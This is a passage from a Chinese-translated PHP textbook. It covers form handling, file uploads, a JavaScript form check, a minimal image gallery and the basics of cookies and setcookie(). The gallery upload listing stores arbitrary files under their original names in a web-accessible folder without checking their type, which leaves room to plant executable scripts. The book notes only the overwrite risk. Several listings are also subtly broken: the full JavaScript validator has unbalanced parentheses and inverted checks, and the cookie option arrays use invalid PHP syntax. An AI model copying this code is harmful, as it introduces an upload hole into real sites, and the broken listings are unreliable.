!is_string($_POST["Terms"])) {
$ok = false;
$errorfields[] = "Terms &amp; conditions";
}
if ($ok) {
?>
<h1>Form Data</h1>
<?php
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Number = htmlspecialchars($Number);
$Section = htmlspecialchars(implode(" ", $Section));
$Comments = nl2br(htmlspecialchars($Comments));
$Terms = htmlspecialchars($Terms);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Number of tickets:</b> $Number<br />";
echo "<b>Section:</b> $Section<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $Terms<br />";
?>
<?php
} else {
echo "<p><b>Form incomplete</b></p>";
echo "<ul><li>";
echo implode("</li><li>", $errorfields);
echo "</li></ul>";
}
}
if (!$ok) {
?>
<h1>World Cup Ticket Service</h1>
<form method="post">
<input type="radio" name="Salutation" value="Mr." <?php
if ($Salutation == "Mr.") {
echo "checked=\"checked\""; }
?>/Mr.
<input type="radio" name="Salutation" value="Ms." <?php
if ($Salutation == "Ms.") {
echo "checked=\"checked\""; }
?>/Ms. <br />
First name <input type="text" name="FirstName" value="<?php
echo htmlspecialchars($Firstname);
?>" /><br />
Last name <input type="text" name="LastName" value="<?php
echo htmlspecialchars($Lastname);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Promo code <input type="password" name="Promo" value="<?php
echo htmlspecialchars($Promo);
?>" /><br />
Number of tickets
<select name="Number">
<option value="0">Please select</option>
<option value="1"<?php
if ($Number == "1") {
echo " selected=\"selected\""; }
?>1</option>
<option value="2"<?php
if ($Number == "2") {
echo " selected=\"selected\""; }
?>2</option>
<option value="3"<?php
if ($Number == "3") {
echo " selected=\"selected\""; }
?>3</option>
<option value="4"<?php
if ($Number == "4") {
    echo " selected=\"selected\"";
}
?>4</option>
</select><br />
Desired section in the stadium
<select name="Section[]" size="4" multiple="multiple">
<option value="north"<?php
if (in_array("north", $Section)) {
    echo " selected=\"selected\"";
}
?>North</option>
<option value="south"<?php
if (in_array("south", $Section)) {
    echo " selected=\"selected\"";
}
?>South</option>
<option value="east"<?php
if (in_array("east", $Section)) {
    echo " selected=\"selected\"";
}
?>East</option>
<option value="west"<?php
if (in_array("west", $Section)) {
    echo " selected=\"selected\"";
}
?>West</option>
</select><br />
Comments/Notes
<textarea cols="70" rows="10" name="Comments"><?php
    echo htmlspecialchars($Comments);
?></textarea><br />
<input type="checkbox" name="Terms" value="ok" <?php
if ($Terms != "") {
    echo "checked=\"checked\" ";
}
?>/>
I accept the terms &amp; conditions.<br />
<input type="submit" name="Submit" value="Place order" />
</form>
<?php
}
?>
</body>
</html>
```

## 清单 13.20 “完美”的表单（"form.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_442_0.png)

图 13.10 发生错误时表单会预填

如您所见，这需要做不少工作。作为纯 HTML 表单，该表单原本不足 40 行，现在大约有 200 行，是原来的五倍。但这项工作是值得的，因为现在表单在功能性和可用性方面非常丰富。最好的一点是，无论您的表单是什么类型、包含哪些字段，流程始终相同。

## 13.5 文件上传

尚未提到的一种表单字段是：`<input type="file" />`。这是一个用于上传文件的字段，允许用户通过 Web 浏览器将文件传输到 Web 服务器。其中一个应用是 Web 邮件脚本，它可以将文件附加到电子邮件中（见图 13.11 和图 13.12）。

PHP 提供了访问此类文件上传的简单集成选项。首先，您需要调整表单：如果未按所示设置表单的 enctype 属性，则无法在服务器端访问传输的数据。还必须通过 POST 发送表单。老实说，对文件依赖 GET 限制也没什么意义：

```html
<form method="post" enctype="multipart/form-data">
```

现在您只需要一个文件上传表单元素：

```html
<input type="file" name="File" />
```

所有上传的文件都可以通过 PHP 中的（超全局）$_FILES 数组访问。如果假设文件在名为 "File" 的表单字段中指定，则以下数组元素值得关注：

- **$_FILES["File"]["error"]**
  发生错误时的任何错误代码

- **$_FILES["File"]["name"]**
  用户系统上的原始文件名

- **$_FILES["File"]["size"]**
  文件大小（字节）

- **$_FILES["File"]["tmp_name"]**
  服务器上的文件（临时）名称

- **$_FILES["File"]["type"]**
  文件的 MIME 类型（由客户端浏览器发送）

清单 13.21 输出所有这些信息。

```php
<html>
<head>
<title>File Upload</title>
</head>
<body>
<?php
if (isset($_FILES["File"])) {
  ksort($_FILES["File"]);
  reset($_FILES["File"]);
  echo "<table>";
  foreach ($_FILES["File"] as $key => $value) {
    $value = is_string($value) ? htmlspecialchars($value) : "";
    echo "<tr><td>$key</td><td>$value</td></tr>";
  }
  echo "</table>";
}
?>
<form method="post" enctype="multipart/form-data" action="">
<input type="file" name="File" />





<input type="submit" value="Upload" />
</form>
</body>
</html>

## 清单 13.21 关于已传输文件的信息（"file-upload-info.php"）

图 13.11 和图 13.12 显示了该脚本在两种不同浏览器中针对同一文件的运行结果。可以看到，Internet Explorer（所使用的古老版本）会传输完整路径，从而向网站提供比实际必要更多的信息。作为交换，文件大小可能不可用——但在大多数情况下，这是由于 Web 服务器造成的。

![](img/ae7820c36e8f24c1623d26668b28e80e_444_0.png)

图 13.11 Chrome 中的已传输文件

![](img/ae7820c36e8f24c1623d26668b28e80e_444_1.png)

图 13.12 Internet Explorer 中的已传输文件

> 提示
> 就编程而言，这意味着只有依赖 basename() PHP 函数，才能获得不带路径的正确文件名。该函数从路径规范中提取实际文件名。

但是，在 PHP 脚本执行完毕后，已传输的文件会被自动删除。因此，你必须确保将文件复制到某个位置，以便继续使用它。

过去这曾伴随着风险。虽然 `$_FILES["file"]["tmp_name"]` 包含文件的临时名称，但攻击者只要稍加努力就可以伪造这些信息，从而指示 PHP 脚本处理一个实际上不应被处理的文件（典型示例：`/etc/passwd`）。PHP 提供了 `is_uploaded_file()` 函数，用于检查文件名是否实际包含通过文件上传传输的文件。既然你事后无论如何都要将文件移动到其他位置，因此应该使用其姐妹函数 `move_uploaded_file()`，该函数将文件移动到目标位置。

**注意**

你可以自行设置文件的缓存位置。如果 `php.ini` 中的 `upload_tmp_dir` 配置选项未设置，则使用操作系统的临时目录。但在某些 PHP 版本中，这仅在 Unix/Linux 系统上特别好用。因此，请务必设置此选项，并且当然要确保 PHP 对所选文件夹具有写入权限。使用 `move_uploaded_file()` 时，目标文件夹也必须具有写入权限。

还有 `upload_max_filesize` 选项，可用于指定要传输的文件的最大尺寸。不过 PHP 会检查此选项：因此文件会被传输，但随后可能会被丢弃。这就是我们不使用此选项的原因，因为你可以使用 `$_FILES["file"]["size"]` 来检查传输了多少个字节。

有些来源声称以下表单字段效果神奇：

```
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
```

甚至浏览器也应该拒绝过大的文件。不过，这根本行不通，即使有效，攻击者仍然可以操纵文件。因此，不要指望你的 PHP 脚本中包含大小“小于 X”的文件，而是应自行检查大小。

如果一次性传输多个文件，请注意 `max_file_uploads` `php.ini` 选项。该选项指定总共可以上传多少个文件。

**提示**

在此背景下，还有另一个实用的配置选项：`post_max_size` 是通过 POST 传输的所有文件的最大尺寸。如果超过此限制，PHP 将不执行目标脚本，以防止 PHP 过载。

## 文件上传的进度条

从技术上讲，可以监控文件上传的进度并在用户界面中显示。问题在于，服务器必须支持此功能，并向浏览器提供相应数据，而在现有的 PHP 选项中，这意味着不使用 FastCGI 和不使用 PHP-FPM。尽管如此，这仍可实现有趣的用例。这些选项是两个最流行的选项：

- PHP 内置的上传进度功能，它通过会话管理工作（参见第 15 章）。在线手册在 [http://s-prs.co/v602218](http://s-prs.co/v602218) 中透露了更多信息。
- `uploadprogress` PECL 扩展，可在 [http://s-prs.co/v602219](http://s-prs.co/v602219) 获得，包含对 PHP 8.x 的支持和 Windows 的二进制文件。简要文档可在 GitHub 上找到，源代码也在 GitHub 上：[http://s-prs.co/v602220](http://s-prs.co/v602220)。

## 13.6 应用示例

在提供了大量信息之后，我们想向你展示两个应用示例，这些示例为示例表单增加了额外功能，并演示了文件上传的实际用途。

### 13.6.1 JavaScript 表单检查

使用 PHP 后，表单现在 _防弹_ 了。这意味着只有在数据完整时，才会对其进行实际的进一步处理。不过，如前所述，表单检查更多是对用户的一种服务，用于防止无意的错误。无法防止 _故意_ 的错误。

但是，JavaScript 客户端脚本语言提供了以更节省资源的方式设置表单检查的可能性。这样可以在 Web 浏览器中检查用户输入，并可能阻止表单被发送。

JavaScript 在这里有些偏离主题，因为我们讨论的是 PHP。尽管如此，了解相关的 Web 技术对于专业的 Web 开发仍然至关重要。

> **注意**
> 
> 在第 28 章中，我们将更详细地讨论 PHP 和 JavaScript 之间的交互。

对 `<form>` 元素进行以下调整，有助于确保在表单发送前对其进行检查：

```
`<form method="post" onsubmit="return check(this);">`
```

`onsubmit` 属性用于指定在表单发送前直接执行的 JavaScript 代码。诀窍是：如果 JavaScript 代码是 `return false`，则表单提交将被取消。在我们的情况中，代码是 `return check(this)`。思路是：表单数据在（自行编写的）JavaScript 函数 `check()` 中进行检查。如果发生错误，`check()` 返回值 `false`。这意味着 `onsubmit` 实际上具有值 `return false`，并且表单被阻止发送。

唯一缺少的是 JavaScript 代码。最好将其放在 HTML 页面的 `<head>` 部分中。必须定义 `check()` 函数；在调用时，要检查的表单的引用作为参数传递。首先，声明一个 `error` 变量，用于存储发生错误的字段名称：

```
<script>
function check(f) {
var error = "";
}
```

现在逐个检查字段。让我们从文本字段开始。这里检查它们的值：

```
if (!f.elements["FirstName"] || f.elements["FirstName"].value == "") {
 error += "First name\n";
}
if (!f.elements["LastName"] || f.elements["LastName"].value == "") {
 error += "Last name\n";
}
if (!f.elements["Email"] || f.elements["Email"].value == "") {
 error += "Email\n";
}
if (!f.elements["Promo"] || f.elements["Promo"].value == "") {
 error += "Promo\n";
}
if (!f.elements["Comments"] || f.elements["Comments"].value == "") {
 error += "Comments\n";
}
```

提示
为什么要用 `!f.elements["Field"]` 进行检查，而相应的字段在表单中存在呢？同样，我们要预见性地编程。如果你为自己的脚本调整 JavaScript 代码，并在复制粘贴时忘记替换某个名称，则可以防止出现 JavaScript 错误消息。

对于单选按钮，必须检查其中是否有任何一个被选中；这可以通过 `checked` JavaScript 属性来完成：

```
if (!f.elements["Salutation"] || (
 !f.elements["Salutation"][0].checked &&
 !f.elements["Salutation"][1].checked)) {
error += "Salutation\n";
}
```

复选框则更简单。这里只需考虑复选框本身——同样是在 checked 属性中：

```
if (!f.elements["terms"].checked) {
 error += "Terms & conditions\n";
}
```

对于选择列表，结果很大程度上取决于“无选中”究竟意味着什么。在示例表单中，单选列表在顶部包含一个占位条目（Please Select），这当然被视为“未填写”。只有从第二个列表条目开始，该字段才被视为正确完成。JavaScript 中列表字段的内部计数从 0 开始；也就是说，从字段编号 1 开始一切正常。所选字段编号位于 selectedIndex 属性中，因此产生以下检查代码：

```
if (!f.elements["Number"] || f.elements["Number"].selectedIndex < 1) {
 error += "Number of tickets\n";
}
```

在多选列表中，很少使用 selectedIndex，因为在查询表单条目时，不仅关心第一个选中元素（即 selectedIndex 中的元素），而且关心所有选中元素。另一方面，在检查字段时，只关心是否选中了任何内容。如果没有，selectedIndex 具有值 -1，我们按如下方式进行检查：

```
if (!f.elements["Section[]"] ||
 f.elements["Section[]"].selectedIndex == -1) {
 error += "Section\n";
}
```

**注意**
必须在 JavaScript 中输入字段的完整名称，包括多选列表名称中的方括号！

最后检查 error 变量。如果其中有内容，则表示发生了错误，因此你应该通知用户（参见图 13.13），并使用 return false 阻止表单发送：

```
if (error != "") {
 alert("** Error in the following fields:\n" + error);
 return false;
} else {
```





```
return true;
}
}
</script>
```

就这样！下面的清单展示了完整的 JavaScript 代码，以一种“更加完美”的形式呈现。

```
<html>
<head>
<title>Order form</title>
<script>
function check(f) {
var error = "";
if (!(f.elements["Salutation"] ||
(f.elements["Salutation"][0].checked &&
!f.elements["Salutation"][1].checked)) {
error += "Salutation\n";
}
if (!f.elements["FirstName"] || f.elements["FirstName"].value == "") {
error += "First name\n";
}
if (!(f.elements["LastName"] || f.elements["LastName"].value == "")) {
error += "Last name\n";
}
if (!f.elements["Email"] || f.elements["Email"].value == "") {
error += "Email\n";
}
if (!(f.elements["Promo"] || f.elements["Promo"].value == "")) {
error += "Promo\n";
}
if (!(f.elements["Number"] || f.elements["Number"].selectedIndex < 1) {
error += "Number of tickets\n";
}
if (!(f.elements["Section[]"] ||
f.elements["Section[]"].selectedIndex == -1) {
error += "Section\n";
}
if (!f.elements["Comments"] || f.elements["Comments"].value == "") {
error += "Comments\n";
}
if (!(f.elements["Terms"] || !f.elements["Terms"].checked) {
error += "Terms & conditions\n";
}
if (error != "") {
alert("** Error in the following fields:\n\n" + error);
return false;
} else {
return true;
}
}
</script>
</head>
<body>
...
<h1>World Cup Ticket Service</h1>
<form method="post" onsubmit="return check(this);" action="">
</form>
<?php
}
?>
</body>
</html>
```

清单 13.22 带有 JavaScript 验证的表单（摘录自 "form-javascript.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_450_0.png)

图 13.13 通过 JavaScript 进行表单检查

> **注意**
>
> 不要依赖 JavaScript 检查。如有疑问，用户始终可以在浏览器中禁用 JavaScript。因此，你必须始终在服务器端进行检查；客户端检查仅可作为补充。

### 13.6.2 图片画廊

作为第二个示例，我们将向你展示文件上传的一个潜在应用：一个（非常简单的）图片画廊。脚本的工作方式应如下：

- 用户通过文件上传上传一幅图形。
- PHP 脚本将文件保存在特定目录中。
- 另一个 PHP 脚本读取此目录中的所有文件，并在 Web 浏览器中使用 `<img src="..." />` 显示它们。

让我们开始吧。上传目录被赋予（有意义的）名称 *upload*，并且当然必须事先手动创建并分配写入权限。通过 `<input type="file" />` 传输的文件使用 `move_uploaded_file()` 移动到此目录。目标文件名如前所述，从 `$_FILES[]` 使用 `basename()` 确定。清单 13.23 显示代码，图 13.14 显示应用程序。

```
<html>
<head>
<title>Gallery: Upload</title>
</head>
<body>
<?php
if (isset($_FILES["File"])) {
	$ourcename = $_FILES["File"]["tmp_name"];
	$targetname = $_FILES["File"]["name"];
	$targetname = "upload/" . basename($targetname);
	if (@move_uploaded_file($ourcename, $targetname)) {
		 echo "<p>File uploaded!</p>";
	} else {
	 echo "<p>Error (maybe a problem with access rights)!<p>";
	 }
}
?>
<form method="post" enctype="multipart/form-data" action="">
<input type="file" name="File" />
<input type="submit" value="Upload" />
</form>
</body>
</html>
```

清单 13.23 画廊的上传表单 ("gallery-upload.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_452_0.png)

图 13.14 不美观，但简单有效：图片画廊

> 注意
>
> 此脚本自然包含潜在的安全漏洞：如果传输的文件名已被占用，PHP 脚本会用同名的旧文件覆盖它。你可以通过在目标名称中添加随机组件（或者，测试现有文件）来防止这种情况：
>
> $target_name = "upload/" . time() . basename($target_name);

在实际的画廊页面中，你需要目录类（在第 25 章中介绍）。它读取所有文件并从中创建 `` 标签。

```
<html>
<head>
<title>Gallery</title>
</head>
<body>
<?php
if ($folder = opendir("upload/")) {
while (false !== ($file = readdir($folder))) {
if ($file != ".." && $file != ".") {
echo "<img src=\"upload/$file\" />\n";
}
}
closedir($folder);
}
?>
</body>
</html>
```

清单 13.24 输出图形 ("gallery.php")

## 13.7 设置

为本章画上句号，我们将介绍与表单访问相关的一些配置选项。

在 php.ini 配置文件中，可为表单处理和文件上传设置表 13.2 中列出的选项。

| 参数 | 描述 | 默认值 |
| :--- | :--- | :--- |
| file_uploads | 指定是否支持文件上传 | "1" |
| post_max_size | 通过 POST 传输的文件的最大大小 | "8M" |
| upload_max_filesize | 传输文件的最大大小 | "2M" |
| upload_tmp_dir | 传输文件的临时目录 | NULL |
| variables_order | 解析时环境变量、GET、POST、Cookie 和服务器数据的顺序 | "EGPCS" |
| max_input_nesting_level | 输入的最大嵌套深度（尤其是与数组相关） | 64 |

表 13.2 "php.ini" 中的配置参数

# 第 14 章

# Cookie

有些人认为 Cookie 是一种烦人的数据收集方式。然而，没有 Cookie，许多 Web 应用程序就无法想象了。PHP 提供对数据 Cookie 的便捷访问。

HTTP 是一种无状态协议；也就是说，它没有内存。这意味着在两个页面请求之间无法暂时存储数据。第一页上仍然可用的所有信息在下一页都会丢失。有几种解决此问题的方法，将在本章和下一章中介绍。首先，我们将研究 Cookie——有用但有争议的小碎片 Cookie。

## 14.1 准备工作

Cookie 支持直接集成在 PHP 中。这意味着不需要额外安装。但是，为了更好地理解本章中的示例，查看 Web 浏览器的 Cookie 设置很有用。根据浏览器的不同，Cookie 要么会自动激活，要么在每次新 Cookie 到达时会出现一条警告消息。

在 Safari 中，这些设置位于 Safari • 偏好设置 • 隐私下。单击“阻止所有 Cookie”（见图 14.1）后，Cookie 将不再起作用——大多数网站也将无法正常工作，如警告消息所示。

![](img/ae7820c36e8f24c1623d26668b28e80e_455_0.png)

图 14.1 Safari 浏览器中的 Cookie 设置

在 Chrome 浏览器中，Cookie 设置位于网址 _chrome://settings_ 下，然后位于“隐私和安全性” • “第三方 Cookie”（见图 14.2）下。只有第三方提供商的 Cookie（通常，广告商会在第三方网站上显示包含 Cookie 的内容）才能在此通过界面阻止。

![](img/ae7820c36e8f24c1623d26668b28e80e_456_0.png)

图 14.2 Chrome 中的 Cookie 设置

![](img/ae7820c36e8f24c1623d26668b28e80e_456_1.png)

图 14.3 Firefox 中的 Cookie 设置

Firefox 浏览器（以及所有其他浏览器）也在浏览器设置中提供 Cookie 处理选项。你可以通过“工具” • “设置” • “隐私与安全性”访问此功能，然后在“增强型跟踪保护”区域进行相应设置（见图 14.3）。

## 14.2 事实与背景

但这些不祥的 Cookie 到底是什么？这个想法源自 Netscape，时间是 20 世纪 90 年代中期，当时该公司仍然是 Web 浏览器的全球市场领导者。原始说明文档的副本可在 http://s-prs.co/v602279 上找到。它指的是一份“初步规范”，即暂定说明。尽管如此，大多数浏览器制造商都遵循这些规范。一种具有扩展可能性的新方法可在 http://s-prs.co/v602280 上找到。

### 14.2.1 什么是 Cookie？

_Cookie_ 是在服务器（Web 服务器）和客户端（Web 浏览器）之间来回发送的文本信息。Web 服务器将 Cookie 作为请求 HTTP 标头的一部分发送。这在标头条目中按以下模式表达：

```
Set-Cookie: ProgrammingLanguage=PHP
Set-Cookie: LanguageVersion=8
```

Web 浏览器接收此数据并根据配置对其进行处理，从而产生以下结果之一：

- Cookie 被保存。
- Cookie 被拒绝。
- 用户被询问是否应接受或拒绝 Cookie。

Web 服务器最初不知道 Cookie 究竟发生了什么。文本信息存储在用户的硬盘或系统内存中。真正的技巧只有在下次从 Web 服务器调用页面时才会显现，即 Web 浏览器将 Cookie 发回给 Web 服务器。它看起来像这样：

```
Cookie: ProgrammingLanguage=PHP; LanguageVersion=8
```

这样服务器就可以再次访问之前发送的数据并识别用户。

Cookie 本身最终会保存在用户的硬盘上。确切实现由每个浏览器制造商负责，并且总是略有不同。通常使用基于文件的数据库，例如 SQLite。





Cookie 还有一种可能性，即仅存储在内存中而非永久存储在硬盘上。因此，重新启动浏览器后，此数据将不再可用。在某些情况下，这种行为可能是可取的。

### 14.2.2 限制

为了发布 Cookie 规范，采取了某些预防措施。

可能最重要的限制是，Cookie 只能由设置它的服务器读取。因此，来自 `www.php.net` 的 Cookie 在网站 `www.asp.net` 上不可见——反之亦然。但是，可以将 Cookie 绑定到二级域名（SLD）。如果将 `.php.net` 指定为 Cookie 域（带有前导点），则此 Cookie 不仅可以从 `www.php.net` 读取，还可以从 `pecl.php.net` 和 `windows.php.net` 等读取。甚至可以将 Cookie 限制在域中的某个路径内。如果 Cookie 的路径设置为 `/government`，则无法从 `/opposition` 页面访问它，反之亦然。

数据量方面也有限制。Cookie 本身只能包含 4 KB（4,096 个字符）的数据。这适用于 Cookie 的名称和值。如果两者合计超过 4 KB，值可能会被截断，但名称保持完整（前提是名称小于 4 KB，这大概可以假设）。请注意，这是对浏览器的最低要求，浏览器也可以自行酌情处理更长的 Cookie。

网络浏览器还被指示最多只接受 300 个 Cookie。每个域只允许 20 个 Cookie。一旦超过其中任何一个限制（即总计到达第 301 个 Cookie 或域内到达第 21 个 Cookie），相应的最旧 Cookie 可能会被删除。这些限制可以追溯到硬盘空间几乎难以负担的年代。现代浏览器对这些限制更为宽松。

### 14.2.3 透明冲浪者？

因此，Cookie 只能由设置它们的服务器读取。那么，为什么 Cookie 的形象如此糟糕呢？Cookie 通常被称为*透明冲浪者*，这让人联想到一个可怕的景象：Web 用户在不知情的情况下向网站泄露了所有个人数据。

主要原因之一仍然是历史问题。在 1997 年 3 月刊的 *Byte* 杂志中，Jon Udell 撰写了一篇关于数字证书的文章。其中指出，这些数字 ID 明显优于 Cookie；更糟糕的是，Cookie 不能保证隐私，因为任何 Web 服务器都可以读取客户端计算机上的每个 Cookie。这一错误陈述——如前一节所示——迅速传播开来；甚至有传言称 Cookie 可被其他 Web 服务器用于读取用户的硬盘（嗯，Cookie 确实存储在用户的硬盘上）。

两个月后，即 1997 年 5 月，过期已久的更正出现在边栏的一个小方框中。作者承认他根本没有核实自己的主张，尽管从技术上讲这非常容易。他还声称自己有“窃取”Cookie 信息的想法，但未经核实就印刷了可能的结果（Cookie 不安全）。事实证明，这是不可能的。作者违反了至关重要的基本新闻准则，但损害已经造成。直到今天，许多人仍然不清楚 Cookie 是什么以及它们带来什么风险（另见第 14.5 节）——以及哪些风险仅仅是危言耸听。完全摒弃所有偏见和顾虑，我们现在将探讨如何在 PHP 中使用 Cookie。

## 14.3 在 PHP 中使用 Cookie

如前所述，Cookie 处理（读/写）完全通过 HTTP 头部进行。但 PHP 之所以是 PHP，正是因为用户不必亲自执行这项繁琐的过程。

### 14.3.1 设置 Cookie

setcookie() 函数有两种不同的语法选项。最常见的是以下语法（我们将稍后讨论替代方案）：

```
boolean setcookie ( string name [, string value [, int expires [, string path [, string domain [, bool secure[, bool httponly]]]]]])
```

表 14.1 解释了七个参数的含义。基于这种数量，您会欣赏 PHP 的命名函数参数特性，但这要等几页之后，因为首先需要考虑一个特殊功能。

| 参数 | 描述 | 数据类型 |
| :--- | :--- | :--- |
| name | Cookie 的名称；此参数是唯一的必填参数。其他所有参数均为可选。 | String |
| value | Cookie 的值。 | String |
| expires | Cookie 的过期日期，以自 1970 年 1 月 1 日以来的秒数表示。 | Integer |
| path | 可读取 Cookie 的目录。 | String |
| domain | 有权访问 Cookie 的域。 | String |
| secure | 指定 Cookie 是否只能通过 HTTPS 连接发送的值。 | Boolean |
| httponly | 指示 Cookie 对 JavaScript 是否“不可见”。 | Boolean |

表 14.1 "setcookie()" 的参数

各个参数（除 name 和 value 外）将在后面分别详细介绍。

#### 过期日期

Cookie 有两种类型，根据过期日期有所不同：
- 临时 Cookie 或会话 Cookie，仅在浏览器关闭前有效
- 持久 Cookie 或永久 Cookie，在指定的过期日期前有效

过期日期按表 14.1 所示设置，指定为整数值。使用的“计量单位”是 Unix 世界的纪元值：自 1970 年 1 月 1 日以来经过的秒数。有两种主要方法可以快速直观地计算这样的值：

- time() 以纪元值形式返回当前日期和时间。如果要使 Cookie 从当前时间起在某个时间段内有效，请将相应的秒数添加到 time() 的返回值中。例如，有效期为一天的 Cookie 的过期日期值如下：`time() + 60*60*24` 即，每分钟 60 秒，每小时 60 分钟，每天 24 小时。
- mktime() 将日期转换为纪元值。例如，有效期至 2025 年平安夜（12 月 24 日）中午 12 点的 Cookie 的过期日期值如下：`mktime(12, 0, 0, 12, 24, 2025)`

> 注意
> 有关这些及其他日期函数的更多信息，请参见第 9 章。

如果 Cookie 没有过期日期（即 setcookie() 没有第三个参数，或第三个参数为零），则它是临时 Cookie。浏览器关闭时系统会将其删除，因此下次启动浏览器时它不再存在。以下代码片段设置了一些 Cookie：

```
<?php
setcookie("ProgrammingLanguage", "PHP",
time() + 60*60*12); // valid for 12 hours
setcookie("LanguageVersion", "8",
mktime(0, 0, 0, 12, 24, 2025)); // Dec 24, 2025
setcookie("Session", "abc123"); // temporary
?>
```

#### 路径

Cookie 不仅可以绑定到域，还可以绑定到目录。在过去，当独立域名仍然非常昂贵时，这一点尤为重要，因此许多网站的 URL 形如 www.site.xyz/username。当然，如果在 www.site.xyz/username1 上设置了 Cookie，竞争对手 www.site.xyz/username2 可以读取它，这将是灾难性的。因此，PHP 中 Cookie 的标准行为如下：设置 Cookie 的目录也用作 Cookie 路径的值。在 www.your-company.xyz/products/index.php 上设置的 Cookie 无法从主页 www.your-company.xyz/index.php 读取！因此，最好将 Cookie 路径设置为主目录：

```
<?php
setcookie("ProgrammingLanguage", "PHP",
time() + 60*60*12, "/");
?>
```

如果您只需要在网站的特定区域（例如管理区域）中使用 Cookie，相应地设置路径也同样有用。最终，您将获得微小但显著的性能提升：Web 浏览器不再为所有页面在 HTTP 头部中发送 Cookie，而仅为指定路径内的 URL 发送 Cookie。

#### 域

setcookie() 的第五个参数是有权访问 Cookie 的域。默认情况下——即，如果您未指定域名——浏览器会直接从 URL 中获取相关域。因此，如果用户通过 IP 地址访问您的网站，则仅使用此 IP 地址；域名将不起作用。

在原始规范中，Netscape 开发者规定域名必须包含至少两个点。因此，如果要用一个 Cookie“服务”于 pecl.php.net、windows.php.net 和 www.php.net，则必须输入 ".php.net" 作为值，包括前导点。

较新的浏览器不一定需要两个点。但是，为了获得最大程度的浏览器兼容性，如果可能，应始终在域名中指定至少两个点。

现在有人想出了一个巧妙的技巧，可以跨多个域使用和收集 Cookie。整个过程在第 14.5 节中详细描述。该方法的核心组件是指定一个外部域。这意味着 Cookie 在 www.php.net 上设置，但 www.asp.net 被指定为域名。但是，此类“外部 Cookie”会被多个浏览器拒绝或可能被拒绝。以下是一个带有域值的 Cookie 代码片段：



```php
<?php
setcookie("ProgrammingLanguage", "PHP",
      time() + 60*60*12, "/", ".php.net");
?>
```

此 Cookie 可从 php.net 的所有子域中读取。

## 安全

最后，setcookie() 的第六个参数值得一提。如果将其设置为 true，则 Cookie 仅通过安全连接（即通过 HTTPS）发送。因此，如果在 Cookie 中存储敏感数据，则应设置此参数——但此时还需要一个支持 HTTPS 的 Web 服务器。

如果省略此参数（或将其设置为 false），则 Cookie 仅通过 HTTP 发送，而不通过 HTTPS。

> > **注释**
> > 但是，在 Cookie 中隐藏敏感数据（无论是否加密）不一定有好处；事实上，这是不宜的。最好将此数据专门存储在服务器上。在下一章中，您将了解如何实现这一点。

```php
<?php
setcookie("password", "top secret",
      time() + 60*60*12, "/", ".php.net",
      true);
?>
```

## httpOnly

跨站点脚本（XSS，一种针对 Web 应用程序的攻击，我们将在第 32 章中详细讨论）的一种可能表现形式是，被偷偷植入的 JavaScript 代码可以访问 Cookie。微软建议如何至少使这变得更加困难：如果将 httpOnly 指定为 Cookie 的附加参数，则 Cookie 与以前一样与完整的 HTTP 通信一起发送，但 JavaScript 不再能看到 Cookie。1 与此同时，其他浏览器开发商也纷纷效仿，也追加了该功能。

1 在某些配置下，JavaScript 仍然可以访问 Cookie，但需要付出一些努力。

```php
<?php
setcookie("password", "top secret",
    time() + 60*60*12, "/", ".php.net",
    true, true);
?>
```

## 替代语法和命名参数

大量可能的参数是使用命名参数的一个典型示例。但是，如果我们将前面的代码写成如下形式，会发生什么呢？

```php
<?php
setcookie(name: "password", value: "top secret",
    expires: time() + 60*60*12, path: "/", domain: ".php.net",
    secure: true, httponly: true);
?>
```

PHP 会以如下错误作出回应：

> PHP Fatal error: Uncaught Error: Unknown named parameter $expires in ..\set.php:3

要解决这个难题，我们需要稍作展开。为了使 setcookie() 函数尽可能灵活，如前所述，存在一种替代语法：

```
setcookie ( string $name [, string $value = "" [, array $options = [] ]] )
```

换句话说，除名称和值之外的所有参数都存储在数组中，因此上述调用可以重写如下：

```
setcookie("password", "top secret",
[
    expires: time() + 60*60*12,
    path: "/",
    domain: ".php.net",
    secure: true,
    httponly: true,
]
);
```

必须能够协调这两个不同的函数签名。`basic_functions.stub.php` 文件² 揭示了方法：

```
function setcookie(string $name, string $value = "", array|int $expires_or_options = 0, string $path = "", string $domain = "", bool $secure = false, bool $httponly = false): bool {}
```

2 参见 http://s-prs.co/v60222i。

因此，第三个参数称为 expires_or_options。如果值是数字，则将其用作过期日期；如果是数组，则期望一组选项。这不是一个很好的解决方案，但在技术上是必要的。因此，下面的调用是可能的：

```php
<?php
setcookie(name: "password", value: "top secret",
    expires_or_options: time() + 60*60*12, path: "/", domain: ".php.net",
    secure: true, httponly: true);
?>
```

## SameSite Cookie

SameSite Cookie 是一个热门话题。一方面，可以防止跨站请求伪造（CSRF）攻击，或者至少使其更加困难；另一方面，Google Chrome 决定为 Cookie 提供某些 SameSite 功能作为默认设置，这导致众多 Web 应用程序出现了未计划的额外工作。从本质上讲，每个 Cookie 都有三个 SameSite 级别之一（见表 14.2）。如果发生跨站请求——即，域 A 的页面在浏览器中加载，并向域 B 发送链接或表单——则域 B 的 Cookie 不会始终随请求一起发送。

| 参数 | 说明 |
|---|---|
| None | Cookie 处理与以前一样，没有特定限制 |
| Lax | Cookie 仅通过 HTTP GET 随跨站请求发送 |
| Strict | 跨站请求不转发 Cookie |

表 14.2 Cookie 的 SameSite 级别

由于 Chrome 已将 Lax 模式设为默认模式（Firefox 也宣布将在某个时间点效仿），因此可能需要采取行动。

这使我们可以建立与 PHP 的桥梁：setcookie() 和 setrawcookie() 没有针对 SameSite 模式的专用参数。但是，可以通过选项数组设置此值：

```
setcookie(name: "Password", value: "top secret",
options: [
expires: time() + 60*60*12,
path: "/",
domain: ".php.net",
secure: true,
httponly: true,
samesite: "None",
]);
```

## 时机

